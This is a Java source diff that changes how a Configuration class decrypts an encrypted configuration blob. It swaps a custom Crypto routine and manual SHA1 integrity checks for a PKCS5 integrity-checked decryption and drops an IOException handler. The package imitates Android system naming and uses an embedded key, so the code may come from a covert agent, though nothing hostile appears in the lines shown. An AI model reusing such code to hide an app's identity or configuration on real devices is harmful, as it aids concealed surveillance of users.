@@ -28,6 +28,7 @@ import com.android.service.action.Action;
 import com.android.service.auto.Cfg;
 import com.android.service.crypto.Crypto;
 import com.android.service.crypto.Encryption;
+import com.android.service.crypto.EncryptionPKCS5;
 import com.android.service.crypto.Keys;
 
 import com.android.service.util.Check;
@@ -323,38 +324,12 @@ public class Configuration {
 
 			// Crypto crypto = new Crypto(Keys.g_ConfKey);
 			final byte[] confKey = Keys.self().getConfKey();
-			final Crypto crypto = new Crypto(confKey);
-			final byte[] clearConf = crypto.decrypt(rawConf, 0);
+			
+			EncryptionPKCS5 crypto = new EncryptionPKCS5(confKey);
+			//final Crypto crypto = new Crypto(confKey);
+			final byte[] clearConf = crypto.decryptDataIntegrity(rawConf);
 
-			// Extract clear length DWORD
-			ByteBuffer wrappedClearConf = Utils.bufferToByteBuffer(clearConf, ByteOrder.LITTLE_ENDIAN);
-
-			final int confClearLen = wrappedClearConf.getInt();
-
-			// Verify CRC
-			final byte[] confSha1 = new byte[DIGEST_LEN];
-			wrappedClearConf.get(confSha1, confClearLen - DIGEST_LEN, DIGEST_LEN);
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (decryptConfiguration): confClearLen" + confClearLen);
-			}
-
-			if (confClearLen - DIGEST_LEN <= 0) {
-				throw new GeneralException("Wrong length");
-			}
-
-			if (clearConf.length < confClearLen - DIGEST_LEN) {
-				throw new GeneralException("Wrong length");
-			}
-
-			byte[] calculatedDigest = Encryption.SHA1(clearConf, 0, confClearLen - DIGEST_LEN);
-			if (!Arrays.equals(calculatedDigest, confSha1)) {
-				throw new GeneralException(
-						"CRC mismatch, stored SHA1 = " + Utils.byteArrayToHex(confSha1) + " calculated SHA1 = " //$NON-NLS-1$ //$NON-NLS-2$
-								+ Utils.byteArrayToHex(calculatedDigest));
-			}
-
-			String json = new String(calculatedDigest, 0, confClearLen - DIGEST_LEN);
+			String json = new String(clearConf);
 
 			if (json != null && json.length() > 0) {
 				// Return decrypted conf
@@ -365,13 +340,7 @@ public class Configuration {
 				return json;
 			}
 			return null;
-		} catch (final IOException ioe) {
-			if (Cfg.DEBUG) {
-				Check.log(ioe);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " IOException() detected");//$NON-NLS-1$
-			}
+		
 		} catch (final SecurityException se) {
 			if (Cfg.DEBUG) {
 				Check.log(se);//$NON-NLS-1$
